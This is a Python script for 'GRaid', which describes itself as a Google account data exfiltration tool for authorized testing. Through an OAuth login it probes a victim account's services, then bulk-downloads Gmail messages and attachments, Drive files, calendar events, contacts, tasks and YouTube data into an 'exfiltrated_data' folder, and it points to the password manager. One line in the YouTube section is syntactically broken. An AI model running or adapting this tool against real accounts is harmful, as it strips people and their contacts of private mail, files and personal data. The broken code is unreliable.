#!/usr/bin/env python3

import os
# Disable OAUTHLIB's scope checking - Google may add openid automatically
os.environ['OAUTHLIB_RELAX_TOKEN_SCOPE'] = '1'

import json
import pickle
import base64
import argparse
from datetime import datetime
from pathlib import Path

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload
import io

# Define OAuth 2.0 scopes for all Google services
SCOPES = [
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/calendar.readonly',
    'https://www.googleapis.com/auth/contacts.readonly',
    'https://www.googleapis.com/auth/userinfo.profile',
    'https://www.googleapis.com/auth/userinfo.email',
    'https://www.googleapis.com/auth/tasks.readonly',
    'https://www.googleapis.com/auth/youtube.readonly',
    'https://www.googleapis.com/auth/admin.directory.user.readonly',
    'https://www.googleapis.com/auth/admin.directory.group.readonly',
    'https://www.googleapis.com/auth/admin.directory.orgunit.readonly',
    'https://www.googleapis.com/auth/admin.directory.domain.readonly',
]

class GoogleDataExfiltrator:
    def __init__(self, output_dir='exfiltrated_data', limits=None):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.creds = None
        self.services = {}
        
        # Default limits to prevent indefinite execution
        self.limits = limits or {
            'gmail_messages': 100,
            'drive_files': 50,
            'calendar_events': 1000,
            'contacts': None,
            'tasks': None,
            'youtube_videos': 500
        }
        
        self.is_workspace = False
        self.is_admin = False
        
    def authenticate(self, credentials_file='credentials.json'):
        """Authenticate using OAuth 2.0"""
        token_file = 'token.pickle'
        
        if os.path.exists(token_file):
            with open(token_file, 'rb') as token:
                self.creds = pickle.load(token)
        
        if not self.creds or not self.creds.valid:
            if self.creds and self.creds.expired and self.creds.refresh_token:
                self.creds.refresh(Request())
            else:
                if not os.path.exists(credentials_file):
                    print(f"ERROR: {credentials_file} not found!")
                    print("\nTo get credentials:")
                    print("1. Go to https://console.cloud.google.com/")
                    print("2. Create a new project or select existing")
                    print("3. Enable Gmail, Drive, Calendar, and People APIs")
                    print("4. Create OAuth 2.0 credentials (Desktop app)")
                    print("5. Download and save as 'credentials.json'")
                    return False
                
                flow = InstalledAppFlow.from_client_secrets_file(
                    credentials_file, SCOPES)
                self.creds = flow.run_local_server(port=0)
            
            with open(token_file, 'wb') as token:
                pickle.dump(self.creds, token)
        
        print("[+] Authentication successful!")
        return True
    
    def initialize_services(self):
        """Initialize all Google API services"""
        try:
            self.services['gmail'] = build('gmail', 'v1', credentials=self.creds)
            self.services['drive'] = build('drive', 'v3', credentials=self.creds)
            self.services['calendar'] = build('calendar', 'v3', credentials=self.creds)
            self.services['people'] = build('people', 'v1', credentials=self.creds)
            self.services['tasks'] = build('tasks', 'v1', credentials=self.creds)
            self.services['youtube'] = build('youtube', 'v3', credentials=self.creds)
            
            # Try to initialize admin services (will fail for non-admin users)
            try:
                self.services['admin_directory'] = build('admin', 'directory_v1', credentials=self.creds)
                print("[+] All services initialized (including admin services)")
                self.is_admin = True
            except Exception:
                print("[+] All services initialized (admin services not available)")
                self.is_admin = False
            
            # Detect if this is a Workspace account
            try:
                profile = self.services['gmail'].users().getProfile(userId='me').execute()
                email = profile.get('emailAddress', '')
                if not email.endswith('@gmail.com'):
                    self.is_workspace = True
                    print(f"[+] Workspace account detected: {email}")
                else:
                    print(f"[+] Personal Gmail account: {email}")
            except:
                pass
            
            return True
        except Exception as e:
            print(f"[-] Error initializing services: {e}")
            print("[!] Note: Some APIs may need to be enabled in Google Cloud Console")
            return False
    
    def probe_active_services(self):
        """Probe account to detect which services are active and contain data"""
        print("\n" + "="*60)
        print("Probing account for active services...")
        print("="*60 + "\n")
        
        active_services = {}
        
        # Probe Gmail
        print("[*] Probing Gmail...", end=" ")
        try:
            profile = self.services['gmail'].users().getProfile(userId='me').execute()
            message_count = profile.get('messagesTotal', 0)
            if message_count > 0:
                active_services['gmail'] = {
                    'active': True,
                    'email': profile.get('emailAddress'),
                    'messages': message_count,
                    'threads': profile.get('threadsTotal', 0)
                }
                print(f"✓ ACTIVE ({message_count} messages)")
            else:
                active_services['gmail'] = {'active': False, 'reason': 'No messages'}
                print("✗ Empty")
        except Exception as e:
            active_services['gmail'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Drive
        print("[*] Probing Google Drive...", end=" ")
        try:
            results = self.services['drive'].files().list(pageSize=1).execute()
            files = results.get('files', [])
            if files:
                about = self.services['drive'].about().get(fields='storageQuota').execute()
                storage = about.get('storageQuota', {})
                active_services['drive'] = {
                    'active': True,
                    'has_files': True,
                    'storage_used': storage.get('usage', 'Unknown')
                }
                print(f"✓ ACTIVE (Files found)")
            else:
                active_services['drive'] = {'active': False, 'reason': 'No files'}
                print("✗ Empty")
        except Exception as e:
            active_services['drive'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Calendar
        print("[*] Probing Google Calendar...", end=" ")
        try:
            calendars_result = self.services['calendar'].calendarList().list().execute()
            calendars = calendars_result.get('items', [])
            if calendars:
                has_events = False
                total_events = 0
                for calendar in calendars:
                    try:
                        events_result = self.services['calendar'].events().list(
                            calendarId=calendar['id'],
                            maxResults=1
                        ).execute()
                        if events_result.get('items'):
                            has_events = True
                            events_count = self.services['calendar'].events().list(
                                calendarId=calendar['id']
                            ).execute()
                            total_events += len(events_count.get('items', []))
                    except:
                        pass
                
                active_services['calendar'] = {
                    'active': has_events,
                    'calendars': len(calendars),
                    'events': total_events if has_events else 0
                }
                if has_events:
                    print(f"✓ ACTIVE ({len(calendars)} calendars, {total_events} events)")
                else:
                    print(f"✗ Empty ({len(calendars)} calendars, no events)")
            else:
                active_services['calendar'] = {'active': False, 'reason': 'No calendars'}
                print("✗ No calendars")
        except Exception as e:
            active_services['calendar'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Contacts
        print("[*] Probing Google Contacts...", end=" ")
        try:
            results = self.services['people'].people().connections().list(
                resourceName='people/me',
                pageSize=1,
                personFields='names'
            ).execute()
            connections = results.get('connections', [])
            if connections:
                total = results.get('totalPeople', 0)
                active_services['contacts'] = {
                    'active': True,
                    'total': total
                }
                print(f"✓ ACTIVE ({total} contacts)")
            else:
                active_services['contacts'] = {'active': False, 'reason': 'No contacts'}
                print("✗ Empty")
        except Exception as e:
            active_services['contacts'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe Google Tasks
        print("[*] Probing Google Tasks...", end=" ")
        try:
            task_lists = self.services['tasks'].tasklists().list().execute()
            lists = task_lists.get('items', [])
            if lists:
                has_tasks = False
                total_tasks = 0
                for task_list in lists:
                    tasks = self.services['tasks'].tasks().list(
                        tasklist=task_list['id']
                    ).execute()
                    if tasks.get('items'):
                        has_tasks = True
                        total_tasks += len(tasks.get('items', []))
                
                active_services['tasks'] = {
                    'active': has_tasks,
                    'lists': len(lists),
                    'tasks': total_tasks
                }
                if has_tasks:
                    print(f"✓ ACTIVE ({len(lists)} lists, {total_tasks} tasks)")
                else:
                    print(f"✗ Empty ({len(lists)} lists, no tasks)")
            else:
                active_services['tasks'] = {'active': False, 'reason': 'No task lists'}
                print("✗ No task lists")
        except Exception as e:
            active_services['tasks'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Probe YouTube
        print("[*] Probing YouTube...", end=" ")
        try:
            channel_results = self.services['youtube'].channels().list(
                part='snippet,statistics',
                mine=True
            ).execute()
            
            if channel_results.get('items'):
                channel = channel_results['items'][0]
                stats = channel.get('statistics', {})
                
                subs_result = self.services['youtube'].subscriptions().list(
                    part='snippet',
                    mine=True,
                    maxResults=1
                ).execute()
                
                has_data = (
                    int(stats.get('videoCount', 0)) > 0 or
                    subs_result.get('items') or
                    int(stats.get('playlistCount', 0)) > 0
                )
                
                active_services['youtube'] = {
                    'active': has_data,
                    'channel_name': channel['snippet'].get('title'),
                    'videos': stats.get('videoCount', 0),
                    'subscribers': stats.get('subscriberCount', 0)
                }
                if has_data:
                    print(f"✓ ACTIVE (Channel: {channel['snippet'].get('title')})")
                else:
                    print("✗ No activity")
            else:
                active_services['youtube'] = {'active': False, 'reason': 'No channel'}
                print("✗ No channel")
        except Exception as e:
            active_services['youtube'] = {'active': False, 'reason': str(e)}
            print(f"✗ Error: {e}")
        
        # Summary
        print("\n" + "="*60)
        print("Reconnaissance Summary")
        print("="*60)
        active_count = sum(1 for s in active_services.values() if s.get('active'))
        print(f"\nActive services: {active_count}/{len(active_services)}")
        print("\nServices with data:")
        for service, info in active_services.items():
            if info.get('active'):
                print(f"  ✓ {service.upper()}")
        
        print("\nInactive/Empty services:")
        for service, info in active_services.items():
            if not info.get('active'):
                reason = info.get('reason', 'Unknown')
                print(f"  ✗ {service.upper()} - {reason}")
        
        print("="*60 + "\n")
        
        return active_services
    
    def exfiltrate_gmail(self):
        """Exfiltrate Gmail emails and attachments"""
        print("\n[*] Starting Gmail exfiltration...")
        gmail_dir = self.output_dir / 'gmail'
        gmail_dir.mkdir(exist_ok=True)
        
        attachments_dir = gmail_dir / 'attachments'
        attachments_dir.mkdir(exist_ok=True)
        
        try:
            profile = self.services['gmail'].users().getProfile(userId='me').execute()
            with open(gmail_dir / 'profile.json', 'w') as f:
                json.dump(profile, f, indent=2)
            print(f"[+] Email: {profile['emailAddress']}")
            print(f"[+] Total messages: {profile['messagesTotal']}")
            
            labels_result = self.services['gmail'].users().labels().list(userId='me').execute()
            labels = labels_result.get('labels', [])
            with open(gmail_dir / 'labels.json', 'w') as f:
                json.dump(labels, f, indent=2)
            print(f"[+] Retrieved {len(labels)} labels")
            
            messages = []
            page_token = None
            
            while True:
                results = self.services['gmail'].users().messages().list(
                    userId='me', pageToken=page_token).execute()
                messages.extend(results.get('messages', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(messages)} message IDs so far...")
            
            print(f"[+] Total messages to download: {len(messages)}")
            
            download_limit = self.limits['gmail_messages']
            messages_to_download = messages[:download_limit] if download_limit else messages
            
            if download_limit and len(messages) > download_limit:
                print(f"[!] Limiting download to {download_limit} messages (out of {len(messages)} total)")
            
            emails_data = []
            for idx, msg in enumerate(messages_to_download):
                try:
                    message = self.services['gmail'].users().messages().get(
                        userId='me', id=msg['id'], format='full').execute()
                    emails_data.append(message)
                    
                    if 'parts' in message['payload']:
                        self._download_attachments(message, attachments_dir)
                    
                    if (idx + 1) % 10 == 0:
                        print(f"[+] Downloaded {idx + 1}/{len(messages_to_download)} messages")
                except Exception as e:
                    print(f"[-] Error downloading message {msg['id']}: {e}")
            
            with open(gmail_dir / 'emails.json', 'w') as f:
                json.dump(emails_data, f, indent=2)
            
            print(f"[+] Gmail exfiltration complete: {len(emails_data)} emails saved")
            
        except Exception as e:
            print(f"[-] Error in Gmail exfiltration: {e}")
    
    def _download_attachments(self, message, attachments_dir):
        """Download email attachments"""
        parts = message['payload'].get('parts', [])
        for part in parts:
            if part.get('filename'):
                attachment_id = part['body'].get('attachmentId')
                if attachment_id:
                    try:
                        attachment = self.services['gmail'].users().messages().attachments().get(
                            userId='me', messageId=message['id'], id=attachment_id).execute()
                        
                        file_data = base64.urlsafe_b64decode(attachment['data'])
                        filename = part['filename']
                        filepath = attachments_dir / f"{message['id']}_{filename}"
                        
                        with open(filepath, 'wb') as f:
                            f.write(file_data)
                    except Exception as e:
                        print(f"[-] Error downloading attachment: {e}")
    
    def exfiltrate_drive(self):
        """Exfiltrate Google Drive files"""
        print("\n[*] Starting Google Drive exfiltration...")
        drive_dir = self.output_dir / 'drive'
        drive_dir.mkdir(exist_ok=True)
        
        try:
            about = self.services['drive'].about().get(fields='*').execute()
            with open(drive_dir / 'about.json', 'w') as f:
                json.dump(about, f, indent=2)
            print(f"[+] Drive storage used: {about.get('storageQuota', {}).get('usage', 'N/A')}")
            
            files = []
            page_token = None
            
            while True:
                results = self.services['drive'].files().list(
                    pageSize=100,
                    fields="nextPageToken, files(id, name, mimeType, size, createdTime, modifiedTime, owners, parents)",
                    pageToken=page_token
                ).execute()
                
                files.extend(results.get('files', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(files)} files so far...")
            
            with open(drive_dir / 'files_list.json', 'w') as f:
                json.dump(files, f, indent=2)
            print(f"[+] Total files found: {len(files)}")
            
            download_limit = self.limits['drive_files']
            files_to_download = files[:download_limit] if download_limit else files
            
            if download_limit and len(files) > download_limit:
                print(f"[!] Limiting download to {download_limit} files (out of {len(files)} total)")
            
            files_dir = drive_dir / 'files'
            files_dir.mkdir(exist_ok=True)
            
            for idx, file in enumerate(files_to_download):
                try:
                    file_id = file['id']
                    file_name = file['name']
                    mime_type = file['mimeType']
                    
                    if 'google-apps' in mime_type:
                        self._export_google_file(file_id, file_name, mime_type, files_dir)
                    else:
                        request = self.services['drive'].files().get_media(fileId=file_id)
                        filepath = files_dir / file_name
                        
                        fh = io.FileIO(str(filepath), 'wb')
                        downloader = MediaIoBaseDownload(fh, request)
                        
                        done = False
                        while not done:
                            status, done = downloader.next_chunk()
                        
                        fh.close()
                    
                    if (idx + 1) % 10 == 0:
                        print(f"[+] Downloaded {idx + 1}/{len(files_to_download)} files")
                        
                except Exception as e:
                    print(f"[-] Error downloading file {file.get('name', 'unknown')}: {e}")
            
            print(f"[+] Drive exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Drive exfiltration: {e}")
    
    def _export_google_file(self, file_id, file_name, mime_type, output_dir):
        """Export Google Docs/Sheets/Slides to standard formats"""
        export_formats = {
            'application/vnd.google-apps.document': ('application/pdf', '.pdf'),
            'application/vnd.google-apps.spreadsheet': ('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', '.xlsx'),
            'application/vnd.google-apps.presentation': ('application/pdf', '.pdf'),
            'application/vnd.google-apps.drawing': ('application/pdf', '.pdf'),
        }
        
        if mime_type in export_formats:
            export_mime, ext = export_formats[mime_type]
            try:
                request = self.services['drive'].files().export_media(
                    fileId=file_id, mimeType=export_mime)
                
                filepath = output_dir / f"{file_name}{ext}"
                fh = io.FileIO(str(filepath), 'wb')
                downloader = MediaIoBaseDownload(fh, request)
                
                done = False
                while not done:
                    status, done = downloader.next_chunk()
                
                fh.close()
            except Exception as e:
                print(f"[-] Error exporting Google file {file_name}: {e}")
    
    def exfiltrate_calendar(self):
        """Exfiltrate Google Calendar events"""
        print("\n[*] Starting Google Calendar exfiltration...")
        calendar_dir = self.output_dir / 'calendar'
        calendar_dir.mkdir(exist_ok=True)
        
        try:
            calendars_result = self.services['calendar'].calendarList().list().execute()
            calendars = calendars_result.get('items', [])
            
            with open(calendar_dir / 'calendars.json', 'w') as f:
                json.dump(calendars, f, indent=2)
            print(f"[+] Found {len(calendars)} calendars")
            
            all_events = {}
            event_limit = self.limits['calendar_events']
            
            for calendar in calendars:
                calendar_id = calendar['id']
                calendar_name = calendar.get('summary', calendar_id)
                
                try:
                    events = []
                    page_token = None
                    
                    while True:
                        events_result = self.services['calendar'].events().list(
                            calendarId=calendar_id,
                            pageToken=page_token,
                            singleEvents=True,
                            orderBy='startTime',
                            maxResults=100
                        ).execute()
                        
                        events.extend(events_result.get('items', []))
                        page_token = events_result.get('nextPageToken')
                        
                        if event_limit and len(events) >= event_limit:
                            events = events[:event_limit]
                            print(f"[!] Limited to {event_limit} events for calendar '{calendar_name}'")
                            break
                        
                        if not page_token:
                            break
                    
                    all_events[calendar_name] = events
                    print(f"[+] Retrieved {len(events)} events from '{calendar_name}'")
                    
                except Exception as e:
                    print(f"[-] Error retrieving events from {calendar_name}: {e}")
            
            with open(calendar_dir / 'all_events.json', 'w') as f:
                json.dump(all_events, f, indent=2)
            
            print(f"[+] Calendar exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Calendar exfiltration: {e}")
    
    def exfiltrate_contacts(self):
        """Exfiltrate Google Contacts"""
        print("\n[*] Starting Google Contacts exfiltration...")
        contacts_dir = self.output_dir / 'contacts'
        contacts_dir.mkdir(exist_ok=True)
        
        try:
            contacts = []
            page_token = None
            contact_limit = self.limits['contacts']
            
            while True:
                results = self.services['people'].people().connections().list(
                    resourceName='people/me',
                    pageSize=100,
                    personFields='names,emailAddresses,phoneNumbers,organizations,addresses,birthdays,biographies',
                    pageToken=page_token
                ).execute()
                
                connections = results.get('connections', [])
                contacts.extend(connections)
                page_token = results.get('nextPageToken')
                
                if contact_limit and len(contacts) >= contact_limit:
                    contacts = contacts[:contact_limit]
                    print(f"[!] Limited to {contact_limit} contacts")
                    break
                
                if not page_token:
                    break
                print(f"[+] Retrieved {len(contacts)} contacts so far...")
            
            with open(contacts_dir / 'contacts.json', 'w') as f:
                json.dump(contacts, f, indent=2)
            
            print(f"[+] Total contacts retrieved: {len(contacts)}")
            print(f"[+] Contacts exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Contacts exfiltration: {e}")
    
    def exfiltrate_tasks(self):
        """Exfiltrate Google Tasks"""
        print("\n[*] Starting Google Tasks exfiltration...")
        tasks_dir = self.output_dir / 'tasks'
        tasks_dir.mkdir(exist_ok=True)
        
        try:
            task_lists_result = self.services['tasks'].tasklists().list().execute()
            task_lists = task_lists_result.get('items', [])
            
            with open(tasks_dir / 'task_lists.json', 'w') as f:
                json.dump(task_lists, f, indent=2)
            print(f"[+] Found {len(task_lists)} task lists")
            
            all_tasks = {}
            for task_list in task_lists:
                list_id = task_list['id']
                list_title = task_list.get('title', list_id)
                
                try:
                    tasks = []
                    page_token = None
                    
                    while True:
                        results = self.services['tasks'].tasks().list(
                            tasklist=list_id,
                            pageToken=page_token,
                            showCompleted=True,
                            showHidden=True
                        ).execute()
                        
                        tasks.extend(results.get('items', []))
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                    
                    all_tasks[list_title] = tasks
                    print(f"[+] Retrieved {len(tasks)} tasks from '{list_title}'")
                    
                except Exception as e:
                    print(f"[-] Error retrieving tasks from {list_title}: {e}")
            
            with open(tasks_dir / 'all_tasks.json', 'w') as f:
                json.dump(all_tasks, f, indent=2)
            
            print(f"[+] Tasks exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Tasks exfiltration: {e}")
    
    def exfiltrate_youtube(self):
        """Exfiltrate YouTube data"""
        print("\n[*] Starting YouTube exfiltration...")
        youtube_dir = self.output_dir / 'youtube'
        youtube_dir.mkdir(exist_ok=True)
        
        try:
            print("[+] Retrieving subscriptions...")
            subscriptions = []
            page_token = None
            
            while True:
                results = self.services['youtube'].subscriptions().list(
                    part='snippet,contentDetails',
                    mine=True,
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                subscriptions.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'subscriptions.json', 'w') as f:
                json.dump(subscriptions, f, indent=2)
            print(f"[+] Retrieved {len(subscriptions)} subscriptions")
            
            print("[+] Retrieving playlists...")
            playlists = []
            page_token = None
            
            while True:
                results = self.services['youtube'].playlists().list(
                    part='snippet,contentDetails',
                    mine=True,
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                playlists.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'playlists.json', 'w') as f:
                json.dump(playlists, f, indent=2)
            print(f"[+] Retrieved {len(playlists)} playlists")
            
            print("[+] Retrieving liked videos...")
            liked_videos = []
            page_token = None
            video_limit = self.limits['youtube_videos']
            
            while True:
                results = self.services['youtube'].videos().list(
                    part='snippet,contentDetails,statistics',
                    myRating='like',
                    maxResults=50,
                    pageToken=page_token
                ).execute()
                
                liked_videos.extend(results.get('items', []))
                page_token = results.get('nextPageToken')
                
                if video_limit and len(liked_videos) >= video_limit:
                    liked_videos = liked_videos[:video_limit]
                    print(f"[!] Limited to {video_limit} liked videos")
                    break
                
                if not page_token:
                    break
            
            with open(youtube_dir / 'liked_videos.json', 'w') as f:
                json.dump(liked_videos, f, indent=2)
            print(f"[+] Retrieved {len(liked_videos)} liked videos")
            
            print("[+] Retrieving channel information...")
            channel_results = self.services['youtube'].channels().list(
                part='snippet,contentDetails,statistics',
                mine=True
            ).execute()
            
            with open(youtube_dir / 'channel_info.json', 'w') as
            json.dump(channel_results, f, indent=2)
            print(f"[+] Retrieved channel information")
            
            print(f"[+] YouTube exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in YouTube exfiltration: {e}")
    
    def check_password_manager(self):
        """Check for Google Password Manager access and provide URL"""
        print("\n[*] Checking Google Password Manager...")
        
        print("\n" + "="*60)
        print("Google Password Manager Detection")
        print("="*60)
        
        print("\nhttps://passwords.google.com")
        
        print("\n" + "="*60)
        print("Password Manager check complete")
        print("="*60)
    
    def _show_manual_links(self):
        """Display links for manual data access"""
        print("\n" + "="*60)
        print("Additional Manual Access")
        print("="*60)
        print("\nPassword Manager:")
        print("https://passwords.google.com")
        
        if self.is_workspace:
            print("\nGoogle Groups:")
            print("https://groups.google.com/my-groups")
        
        print("\n" + "="*60)


def main():
    parser = argparse.ArgumentParser(
        description='GRaid - Google Account Data Exfiltration Tool - For authorized testing only'
    )
    
    parser.add_argument('--credentials', default='credentials.json',
                       help='Path to OAuth credentials file')
    parser.add_argument('--output', default='exfiltrated_data',
                       help='Output directory for exfiltrated data')
    parser.add_argument('--probe', action='store_true',
                       help='Only probe services without exfiltrating')
    parser.add_argument('--gmail', action='store_true',
                       help='Exfiltrate Gmail data')
    parser.add_argument('--drive', action='store_true',
                       help='Exfiltrate Google Drive data')
    parser.add_argument('--calendar', action='store_true',
                       help='Exfiltrate Google Calendar data')
    parser.add_argument('--contacts', action='store_true',
                       help='Exfiltrate Google Contacts data')
    parser.add_argument('--tasks', action='store_true',
                       help='Exfiltrate Google Tasks data')
    parser.add_argument('--youtube', action='store_true',
                       help='Exfiltrate YouTube data')
    parser.add_argument('--passwords', action='store_true',
                       help='Display Google Password Manager URL')
    
    args = parser.parse_args()
    
    # Show banner
    banner = r"""
┌──────────────────────────────────────┐
│  _____ _____            _____ _____  │
│ / ____|  __ \     /\   |_   _|  __ \ │
│| |  __| |__) |   /  \    | | | |  | |│
│| | |_ |  _  /   / /\ \   | | | |  | |│
│| |__| | | \ \  / ____ \ _| |_| |__| |│
│ \_____|_|  \_\/_/    \_\_____|_____/ │
└──────────────────────────────────────┘
                                       
  Google Account Data Exfiltration Tool
  For authorized security testing only
    """
    print(banner)
    
    exfiltrator = GoogleDataExfiltrator(output_dir=args.output)
    
    if not exfiltrator.authenticate(args.credentials):
        return 1
    
    if not exfiltrator.initialize_services():
        return 1
    
    if args.probe:
        exfiltrator.probe_active_services()
        exfiltrator._show_manual_links()
        return 0
    
    if args.gmail:
        exfiltrator.exfiltrate_gmail()
    if args.drive:
        exfiltrator.exfiltrate_drive()
    if args.calendar:
        exfiltrator.exfiltrate_calendar()
    if args.contacts:
        exfiltrator.exfiltrate_contacts()
    if args.tasks:
        exfiltrator.exfiltrate_tasks()
    if args.youtube:
        exfiltrator.exfiltrate_youtube()
    if args.passwords:
        exfiltrator.check_password_manager()
    
    return 0


if __name__ == '__main__':
    exit(main())
